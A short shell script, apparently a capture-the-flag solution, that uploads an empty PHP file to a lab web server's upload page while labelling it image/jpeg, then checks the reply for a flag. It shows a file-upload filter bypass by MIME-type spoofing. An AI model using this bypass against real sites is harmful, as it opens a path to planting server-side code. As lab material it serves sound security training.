#!/bin/sh
touch test.php
curl -s -X POST -F "uploaded=@test.php;type=image/jpeg" -F "Upload=Upload" "http://192.168.1.31/index.php?page=upload" | grep 'flag'
rm test.php